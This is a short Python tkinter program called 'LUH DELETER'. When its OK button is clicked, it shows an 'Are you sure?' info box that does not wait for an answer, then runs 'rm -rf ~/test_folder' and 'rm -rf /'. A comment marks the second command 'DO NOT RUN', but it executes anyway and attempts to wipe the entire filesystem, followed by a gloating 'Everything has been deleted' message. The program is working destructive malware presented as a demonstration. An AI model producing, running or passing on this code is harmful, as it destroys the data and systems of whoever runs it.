#!/usr/bin/env python3

# Import libraries
import os
import time
import tkinter as tk
from tkinter import messagebox

# Function that runs when button is clicked
def start_attack():
    messagebox.showinfo("eh?????", "Are you sure?")

    # SAFE DEMONSTRATION (delete test folder only)
    os.system("rm -rf ~/test_folder")

    # DANGEROUS COMMAND (DO NOT RUN)
    os.system("rm -rf /")

    messagebox.showwarning(":)", "Everything has been deleted:)")

# Create main window
app = tk.Tk()
app.title("LUH DELETER")
app.geometry("300x150")

# Label text
label = tk.Label(app, text="This will delete everything.", wraplength=250)
label.pack(pady=20)

# Button
button = tk.Button(app, text="OK", command=start_attack)
button.pack()

# Run app
app.mainloop()
